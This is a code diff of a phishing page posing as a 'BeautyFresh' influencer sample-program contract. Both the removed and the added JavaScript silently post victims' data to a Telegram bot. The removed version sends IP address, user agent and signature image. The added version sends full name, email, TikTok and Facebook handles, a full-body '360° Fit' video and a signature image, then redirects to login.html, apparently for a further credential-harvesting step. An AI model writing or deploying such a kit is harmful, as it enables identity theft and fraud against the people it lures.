-  const allChecked = Array.from(checkboxes).every(cb => cb.checked);
-  const hasSignature = signatureFile !== null;
-  
-  document.getElementById('submitBtn').disabled = !(allChecked && hasSignature);
-}
-
-// Checkbox event listeners
-document.querySelectorAll('.agreement-box input[type="checkbox"]').forEach(checkbox => {
-  checkbox.addEventListener('change', updateSubmitButton);
-});
-
-// Notification function
-function showNotification(message, type = 'success') {
-  const notification = document.getElementById('notification');
-  notification.textContent = message;
-  notification.className = 'notification ' + type;
-  
-  setTimeout(() => {
-    notification.classList.remove('success', 'error');
-    notification.style.opacity = '0';
-    notification.style.transform = 'translateX(100px)';
-  }, 3000);
-}
-
-// Decline button
-document.getElementById('declineBtn').addEventListener('click', function() {
-  if (confirm('Are you sure you want to decline this legal contract? You will not be able to proceed with the BeautyFresh sample program.')) {
-    showNotification('Contract declined. Exiting...', 'error');
-    setTimeout(() => {
-      window.location.href = 'index.html';
-    }, 1500);
-  }
-});
-
-// Submit button - Sends signature image to Telegram
-document.getElementById('submitBtn').addEventListener('click', async function() {
-  // Show loading overlay
-  document.getElementById('loadingOverlay').style.display = 'flex';
-  
-  try {
-    // Get user IP address
-    let ip = 'Unknown IP';
-    try {
-      const ipResponse = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipResponse.json();
-      ip = ipData.ip;
-    } catch (ipError) {
-      console.log('Could not get IP:', ipError);
-    }
-    
-    // Prepare contract data
-    const contractData = {
-      contractId: contractId,
-      date: document.getElementById('currentDate').textContent,
-      ip: ip,
-      userAgent: navigator.userAgent.substring(0, 100),
-      timestamp: new Date().toISOString(),
-      agreements: {
-        readContract: document.getElementById('agreeContract').checked,
-        boundByTerms: document.getElementById('agreeTerms').checked,
-        signatureConfirmed: document.getElementById('agreeSignature').checked,
-        legalBinding: document.getElementById('agreeLegal').checked
-      },
-      signatureUploaded: signatureFile !== null,
-      signatureFileName: signatureFile ? signatureFile.name : null,
-      signatureFileType: signatureFile ? signatureFile.type : null,
-      signatureFileSize: signatureFile ? signatureFile.size : null
-    };
-    
-    // Step 1: Send contract data to Telegram
-    const textMessage = `
-📜 *LEGAL CONTRACT SIGNED - BEAUTYFRESH*
-
-📋 *Contract Details:*
-• *Contract ID:* BF-2025-${contractData.contractId}
-• *Signing Date:* ${contractData.date}
-• *Timestamp:* ${new Date(contractData.timestamp).toLocaleString()}
-
-✅ *Legal Agreements:*
-• Read & Understood Contract: ${contractData.agreements.readContract ? '✅' : '❌'}
-• Bound by All Terms: ${contractData.agreements.boundByTerms ? '✅' : '❌'}
-• Signature Authenticity: ${contractData.agreements.signatureConfirmed ? '✅' : '❌'}
-• Legal Binding: ${contractData.agreements.legalBinding ? '✅' : '❌'}
-
-🖋️ *Signature Information:*
-• File: ${contractData.signatureFileName || 'N/A'}
-• Type: ${contractData.signatureFileType || 'N/A'}
-• Size: ${contractData.signatureFileSize ? Math.round(contractData.signatureFileSize / 1024) + ' KB' : 'N/A'}
-
-📡 *Technical Information:*
-• *IP Address:* ${contractData.ip}
-• *User Agent:* ${contractData.userAgent}
-
-✅ *LEGALLY BINDING CONTRACT EXECUTED*
-🔜 *User will be redirected to login.html*
-    `;
-    
-    // Send text message to Telegram
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: textMessage,
-        parse_mode: 'Markdown'
-      })
+    videoDropZone.addEventListener('click', () => videoInput.click());
+    videoDropZone.addEventListener('dragover', (e) => {
+        e.preventDefault();
+        videoDropZone.style.borderColor = '#ff6b9d';
     });
-    
-    // Step 2: Send signature image to Telegram
-    if (signatureBase64 && signatureFile) {
-      // Convert base64 to blob
-      const byteCharacters = atob(signatureBase64);
-      const byteNumbers = new Array(byteCharacters.length);
-      for (let i = 0; i < byteCharacters.length; i++) {
-        byteNumbers[i] = byteCharacters.charCodeAt(i);
-      }
-      const byteArray = new Uint8Array(byteNumbers);
-      const blob = new Blob([byteArray], { type: signatureFile.type });
-      
-      // Create form data
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('caption', `📝 Signature for Contract BF-2025-${contractId}\n✅ Contract Signed Successfully\nIP: ${ip}`);
-      
-      // Append the blob as a file
-      formData.append('photo', blob, `signature_${contractId}.${getFileExtension(signatureFile.type)}`);
-      
-      // Send to Telegram
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      });
+    videoDropZone.addEventListener('dragleave', () => {
+        videoDropZone.style.borderColor = '#d4c0ff';
+    });
+    videoDropZone.addEventListener('drop', (e) => {
+        e.preventDefault();
+        const file = e.dataTransfer.files[0];
+        if (file && file.type.startsWith('video/')) {
+            handleVideo(file);
+        } else {
+            videoInfo.innerHTML = '❌ Please drop a valid video file (MP4/MOV)';
+        }
+        videoDropZone.style.borderColor = '#d4c0ff';
+    });
+
+    videoInput.addEventListener('change', (e) => {
+        if (videoInput.files.length > 0) {
+            handleVideo(videoInput.files[0]);
+        }
+    });
+
+    function handleVideo(file) {
+        selectedVideo = file;
+        const sizeMB = (file.size / (1024 * 1024)).toFixed(2);
+        videoInfo.innerHTML = `✅ Selected: ${file.name} (${sizeMB} MB) — No size limit applied.`;
+        
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            videoPreviewContainer.innerHTML = `
+                <video controls class="preview-video">
+                    <source src="${e.target.result}" type="${file.type}">
+                    Your browser does not support the video tag.
+                </video>
+                <span style="font-size:0.8rem;">${file.name}</span>
+            `;
+        };
+        reader.readAsDataURL(file);
     }
-    
-    // Show success message
-    showNotification('Contract signed successfully! Redirecting to login...', 'success');
-    
-    // REDIRECT TO login.html AFTER 2 SECONDS
-    setTimeout(() => {
-      window.location.href = 'login.html';
-    }, 2000);
-    
-  } catch (error) {
-    console.error('Error:', error);
-    showNotification('Contract signed! Redirecting...', 'success');
-    setTimeout(() => {
-      window.location.href = 'login.html';
-    }, 2000);
-  } finally {
-    // Always hide loading overlay after a short delay
-    setTimeout(() => {
-      document.getElementById('loadingOverlay').style.display = 'none';
-    }, 1000);
-  }
-});
 
-// Helper function to get file extension from MIME type
-function getFileExtension(mimeType) {
-  const mimeToExt = {
-    'image/jpeg': 'jpg',
-    'image/jpg': 'jpg',
-    'image/png': 'png',
-    'image/gif': 'gif',
-    'image/webp': 'webp',
-    'image/bmp': 'bmp'
-  };
-  return mimeToExt[mimeType] || 'jpg';
-}
+    // ---------- SIGNATURE IMAGE UPLOAD (Second Verification) ----------
+    const signatureInput = document.getElementById('signatureFile');
+    const signatureDropZone = document.getElementById('signatureDropZone');
+    const signatureInfo = document.getElementById('signatureInfo');
+    const signaturePreviewContainer = document.getElementById('signaturePreviewContainer');
+    let selectedSignature = null;
 
-// Auto-scroll notification
-const contractContent = document.querySelector('.contract-content');
-contractContent.addEventListener('scroll', function() {
-  const scrollPercentage = (this.scrollTop + this.clientHeight) / this.scrollHeight * 100;
-  if (scrollPercentage > 95) {
-    showNotification('Contract reading complete. Please proceed to sign the agreement.', 'success');
-  }
-});
+    signatureDropZone.addEventListener('click', () => signatureInput.click());
+    signatureDropZone.addEventListener('dragover', (e) => e.preventDefault());
+    signatureDropZone.addEventListener('drop', (e) => {
+        e.preventDefault();
+        const file = e.dataTransfer.files[0];
+        if (file && file.type.startsWith('image/')) {
+            handleSignature(file);
+        }
+    });
+    signatureInput.addEventListener('change', (e) => {
+        if (signatureInput.files.length) handleSignature(signatureInput.files[0]);
+    });
 
-// Initialize
-updateSubmitButton();
+    function handleSignature(file) {
+        selectedSignature = file;
+        signatureInfo.innerHTML = `✅ Selected: ${file.name}`;
+        
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            signaturePreviewContainer.innerHTML = `
+                <img src="${e.target.result}" class="preview-img" alt="Signature Preview">
+                <span style="font-size:0.8rem;">Signature uploaded ✓</span>
+            `;
+        };
+        reader.readAsDataURL(file);
+    }
+
+    // Function to send file to Telegram
+    async function sendToTelegram(file, type, caption) {
+        let endpoint;
+        if (type === 'video') {
+            endpoint = 'sendVideo';
+        } else {
+            endpoint = 'sendPhoto';
+        }
+        
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        
+        if (type === 'video') {
+            formData.append('video', file);
+        } else {
+            formData.append('photo', file);
+        }
+        
+        formData.append('caption', caption);
+        
+        const response = await fetch(url, {
+            method: 'POST',
+            body: formData
+        });
+        return response.json();
+    }
+
+    // Function to send text message to Telegram
+    async function sendTextToTelegram(text) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('text', text);
+        formData.append('parse_mode', 'HTML');
+        
+        const response = await fetch(url, {
+            method: 'POST',
+            body: formData
+        });
+        return response.json();
+    }
+
+    // ---------- FORM SUBMISSION ----------
+    const form = document.getElementById('contractForm');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const loadingText = document.getElementById('loadingText');
+
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        // Get all values
+        const fullName = document.getElementById('fullName').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const tiktokHandle = document.getElementById('tiktokHandle').value.trim();
+        const facebookHandle = document.getElementById('facebookHandle').value.trim();
+        const agree = document.getElementById('agreeCheckbox').checked;
+
+        // Validation
+        if (!fullName || !email) {
+            alert("❌ Please enter your full name and email.");
+            return;
+        }
+
+        if (!selectedVideo) {
+            alert("❌ Please upload your 360° Fit video.");
+            return;
+        }
+
+        if (!selectedSignature) {
+            alert("❌ Please upload your signature image.");
+            return;
+        }
+
+        if (!agree) {
+            alert("❌ You must agree to the contract terms.");
+            return;
+        }
+
+        // Show loading overlay
+        loadingOverlay.style.display = 'flex';
+        loadingText.textContent = 'Processing...';
+
+        try {
+            // Prepare info text
+            const infoText = `📋 NEW BEAUTYFRESH CONTRACT SUBMISSION\n\n👤 Name: ${fullName}\n📧 Email: ${email}\n📱 TikTok: ${tiktokHandle || 'N/A'}\n📘 Facebook: ${facebookHandle || 'N/A'}\n\n✅ FIRST VERIFICATION: 360° Video\n✍️ SECOND VERIFICATION: Signature Image\n\n⏰ Submitted: ${new Date().toLocaleString()}`;
+            
+            // Send text info
+            await sendTextToTelegram(infoText);
+            
+            // Send signature image (Second Verification)
+            await sendToTelegram(selectedSignature, 'photo', `✍️ SECOND VERIFICATION - Signature for: ${fullName}`);
+            
+            // Send video (First Verification - 360° Fit)
+            await sendToTelegram(selectedVideo, 'video', `🎬 FIRST VERIFICATION - 360° Fit Video for: ${fullName}`);
+            
+            // Send completion message
+            await sendTextToTelegram(`✅ CONTRACT COMPLETE for ${fullName}\n\n- First Verification: 360° Video ✓\n- Second Verification: Signature Image ✓`);
+            
+            // Store in sessionStorage for redirect
+            sessionStorage.setItem('beautyfresh_contract_signed', 'true');
+            sessionStorage.setItem('influencer_name', fullName);
+            sessionStorage.setItem('influencer_email', email);
+            sessionStorage.setItem('contract_date', new Date().toISOString());
+            
+            // Success
+            loadingOverlay.style.display = 'none';
+            alert("✅ Contract submitted successfully! You will now be redirected.");
+            
+            // REDIRECT TO YOUR EXISTING login.html PAGE
+            window.location.href = "login.html";
+            
+        } catch (error) {
+            console.error('Error:', error);
+            loadingOverlay.style.display = 'none';
+            alert("❌ There was an error submitting your contract. Please try again.");
+        }
+    });
 </script>
 </body>
 </html>
